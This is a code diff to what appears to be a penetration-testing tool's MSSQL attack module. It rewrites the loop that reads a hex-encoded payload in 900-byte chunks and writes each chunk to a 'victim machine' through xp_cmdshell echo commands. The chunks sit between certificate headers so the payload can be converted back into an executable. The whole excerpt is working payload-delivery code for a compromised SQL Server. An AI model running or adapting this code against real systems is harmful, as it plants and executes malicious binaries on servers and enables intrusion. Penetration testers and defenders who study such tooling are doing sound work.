@@ -306,17 +306,22 @@ def deploy_hex2binary(ipaddr, port, username, password):
         # here we start the conversion and execute the payload
         core.print_status("Sending the main payload via to be converted back to a binary.")
         # read in the file 900 bytes at a time
-        with open(os.path.join(core.setdir + 'payload.hex')) as fileopen:
-            core.print_status("Dropping initial begin certificate header...")
-            conn.execute_query("exec master ..xp_cmdshell 'echo -----BEGIN CERTIFICATE----- > {0}.crt'".format(random_exe))
-            for data in fileopen.read(900).rstrip():
-                if not data:
-                    continue
-                core.print_status("Deploying payload to victim machine (hex): {bold}{data}{endc}\n".format(bold=core.bcolors.BOLD,
-                                                                                                           data=data,
-                                                                                                           endc=core.bcolors.ENDC))
-                conn.execute_query("exec master..xp_cmdshell 'echo {data} >> {exe}.crt'".format(data=data,
-                                                                                                exe=random_exe))
+        #with open(os.path.join(core.setdir + 'payload.hex'), 'r') as fileopen:
+        fileopen = open(core.setdir + 'payload.hex', "r")
+        core.print_status("Dropping initial begin certificate header...")
+        conn.execute_query("exec master ..xp_cmdshell 'echo -----BEGIN CERTIFICATE----- > {0}.crt'".format(random_exe))
+        while fileopen:
+            data = fileopen.read(900).rstrip()
+            #for data in fileopen.read(900).rstrip():
+            if data == "":
+                break
+
+            core.print_status("Deploying payload to victim machine (hex): {bold}{data}{endc}\n".format(bold=core.bcolors.BOLD,
+                                                                                                       data=data,
+                                                                                                       endc=core.bcolors.ENDC))
+
+            conn.execute_query("exec master..xp_cmdshell 'echo {data} >> {exe}.crt'".format(data=data,
+                                                                                            exe=random_exe))
         core.print_status("Delivery complete. Converting hex back to binary format.")
         core.print_status("Dropping end header for binary format conversion...")
         conn.execute_query("exec master ..xp_cmdshell 'echo -----END CERTIFICATE----- >> {0}.crt'".format(random_exe))
